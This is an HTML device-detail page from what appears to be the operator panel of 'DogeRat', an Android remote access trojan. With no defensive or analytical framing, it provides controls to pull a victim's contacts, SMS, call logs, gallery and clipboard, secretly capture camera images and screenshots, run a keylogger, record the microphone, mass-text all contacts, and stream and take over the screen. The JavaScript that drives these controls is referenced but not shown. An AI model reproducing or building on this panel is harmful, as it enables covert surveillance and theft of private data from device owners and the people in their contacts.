<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Details - DogeRat</title>
  <link rel="stylesheet" href="/css/style.css">
  <script src="/socket.io/socket.io.js"></script>
</head>
<body>
  <a href="#tab-overview" class="skip-link">Skip to main content</a>
  <div class="container">
    <div class="device-detail">
      <div class="device-detail-header">
        <div>
          <h1 class="device-detail-title" id="device-title">Loading...</h1>
          <p id="device-subtitle" style="color: var(--text-secondary); font-size: 14px; margin-top: 5px;">Device Information</p>
        </div>
        <a href="/" class="back-btn">‚Üê Back to Dashboard</a>
      </div>
      
      <!-- Tabs -->
      <div class="tabs">
        <button class="tab active" data-tab="overview">Overview</button>
        <button class="tab" data-tab="contacts">Contacts</button>
        <button class="tab" data-tab="sms">SMS</button>
        <button class="tab" data-tab="calls">Calls</button>
        <button class="tab" data-tab="gallery">Gallery</button>
        <button class="tab" data-tab="camera">Camera</button>
        <button class="tab" data-tab="screenshots">Screenshots</button>
        <button class="tab" data-tab="keylogger">Keylogger</button>
        <button class="tab" data-tab="actions">Actions</button>
        <button class="tab" data-tab="remote-control">Remote Control</button>
      </div>
      
      <!-- Tab Contents -->
      <div id="tab-overview" class="tab-content active">
        <div class="data-section">
          <h3>Device Information</h3>
          <div class="data-grid" id="device-info-grid">
            <div class="loading">
              <div class="spinner"></div>
              <p>Loading device information...</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-contacts" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Contacts</h3>
            <button class="btn btn-primary" onclick="requestContacts()">Get Contacts</button>
          </div>
          <div id="contacts-list">
            <div class="empty-state">
              <p>No contacts data available. Click "Get Contacts" to fetch.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-sms" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>SMS Messages</h3>
            <button class="btn btn-primary" onclick="requestSMS()">Get SMS</button>
          </div>
          <div id="sms-list">
            <div class="empty-state">
              <p>No SMS data available. Click "Get SMS" to fetch.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-calls" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Call History</h3>
            <button class="btn btn-primary" onclick="requestCalls()">Get Calls</button>
          </div>
          <div id="calls-list">
            <div class="empty-state">
              <p>No call history available. Click "Get Calls" to fetch.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-gallery" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Gallery</h3>
            <button class="btn btn-primary" onclick="requestGallery()">Get Gallery</button>
          </div>
          <div id="gallery-list" class="image-gallery">
            <div class="empty-state">
              <p>No gallery images available. Click "Get Gallery" to fetch.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-camera" class="tab-content">
        <div class="data-section">
          <h3>Camera Captures</h3>
          <div class="action-panel">
            <button class="btn btn-primary" onclick="captureMainCamera()" style="margin-right: 10px;">Capture Main Camera</button>
            <button class="btn btn-primary" onclick="captureSelfieCamera()">Capture Selfie Camera</button>
          </div>
          <div style="margin-top: 20px;">
            <h4 style="margin-bottom: 15px;">Main Camera</h4>
            <div id="main-camera-list" class="image-gallery">
              <div class="empty-state">
                <p>No main camera captures yet.</p>
              </div>
            </div>
          </div>
          <div style="margin-top: 30px;">
            <h4 style="margin-bottom: 15px;">Selfie Camera</h4>
            <div id="selfie-camera-list" class="image-gallery">
              <div class="empty-state">
                <p>No selfie camera captures yet.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-screenshots" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Screenshots</h3>
            <button class="btn btn-primary" onclick="captureScreenshot()">Take Screenshot</button>
          </div>
          <div id="screenshots-list" class="image-gallery">
            <div class="empty-state">
              <p>No screenshots available. Click "Take Screenshot" to capture.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-keylogger" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Keylogger</h3>
            <div>
              <button class="btn btn-primary" id="keylogger-on-btn" onclick="toggleKeylogger(true)">Turn ON</button>
              <button class="btn btn-secondary" id="keylogger-off-btn" onclick="toggleKeylogger(false)">Turn OFF</button>
            </div>
          </div>
          <div id="keylogger-data">
            <div class="empty-state">
              <p>Keylogger is off. Turn it on to start logging keystrokes.</p>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-actions" class="tab-content">
        <div class="action-panel">
          <h3>Device Actions</h3>
          
          <div class="action-grid">
            <div class="data-item">
              <div class="data-item-label">Toast Message</div>
              <input type="text" id="toast-text" class="action-input" placeholder="Enter toast message">
              <button class="btn btn-primary" onclick="sendToast()" style="width: 100%;">Send Toast</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Vibrate Device</div>
              <input type="number" id="vibrate-duration" class="action-input" placeholder="Duration in seconds" min="1" max="60">
              <button class="btn btn-primary" onclick="vibrateDevice()" style="width: 100%;">Vibrate</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Send SMS</div>
              <input type="text" id="sms-number" class="action-input" placeholder="Phone number">
              <input type="text" id="sms-message" class="action-input" placeholder="Message">
              <button class="btn btn-primary" onclick="sendSMS()" style="width: 100%;">Send SMS</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Send SMS to All Contacts</div>
              <input type="text" id="sms-all-text" class="action-input" placeholder="Message text">
              <button class="btn btn-primary" onclick="sendSMSToAll()" style="width: 100%;">Send to All</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Pop Notification</div>
              <input type="text" id="notification-text" class="action-input" placeholder="Notification text">
              <button class="btn btn-primary" onclick="popNotification()" style="width: 100%;">Send Notification</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Open URL</div>
              <input type="url" id="open-url" class="action-input" placeholder="https://example.com">
              <button class="btn btn-primary" onclick="openURL()" style="width: 100%;">Open URL</button>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Get Clipboard</div>
              <button class="btn btn-primary" onclick="getClipboard()" style="width: 100%;">Get Clipboard</button>
              <div id="clipboard-display" style="margin-top: 10px; padding: 10px; background: var(--bg-secondary); border-radius: 6px; font-size: 14px; word-break: break-word;"></div>
            </div>
            
            <div class="data-item">
              <div class="data-item-label">Microphone Recording</div>
              <input type="number" id="mic-duration" class="action-input" placeholder="Duration in seconds" min="1" max="300">
              <button class="btn btn-primary" onclick="recordMicrophone()" style="width: 100%;">Record</button>
            </div>
          </div>
        </div>
      </div>
      
      <div id="tab-remote-control" class="tab-content">
        <div class="data-section">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <h3>Remote Control</h3>
            <div>
              <button class="btn btn-primary" id="start-stream-btn" onclick="startScreenStream()">Start Stream</button>
              <button class="btn btn-secondary" id="stop-stream-btn" onclick="stopScreenStream()" style="display: none;">Stop Stream</button>
              <button class="btn btn-primary" id="start-control-btn" onclick="startRemoteControl()" style="margin-left: 10px;">Start Control</button>
              <button class="btn btn-secondary" id="stop-control-btn" onclick="stopRemoteControl()" style="display: none; margin-left: 10px;">Stop Control</button>
            </div>
          </div>
          
          <div class="screen-viewer-container" id="screen-viewer-container" style="width: 100%; height: 600px; background: #000; border-radius: 8px; overflow: hidden; position: relative; margin-bottom: 15px;">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; text-align: center;">
              <p>Screen viewer will appear here</p>
              <p style="font-size: 12px; color: #999; margin-top: 10px;">Click "Start Stream" to begin</p>
            </div>
          </div>
          
          <div class="control-panel" style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px;">
            <button class="btn btn-secondary" onclick="resetView()">Reset View</button>
            <button class="btn btn-secondary" onclick="zoomIn()">Zoom In</button>
            <button class="btn btn-secondary" onclick="zoomOut()">Zoom Out</button>
            <button class="btn btn-secondary" onclick="toggleFullscreen()">Fullscreen</button>
          </div>
          
          <div class="stream-status" id="stream-status" style="padding: 10px; background: var(--bg-secondary); border-radius: 6px; font-size: 14px;">
            <p><strong>Status:</strong> <span id="stream-status-text">Not streaming</span></p>
            <p><strong>FPS:</strong> <span id="stream-fps">0</span></p>
            <p><strong>Control:</strong> <span id="control-status-text">Not active</span></p>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  <script src="/js/app.js"></script>
  <script src="/js/screenViewer.js"></script>
  <script src="/js/remoteControl.js"></script>
  <script src="/js/device.js"></script>
</body>
</html>

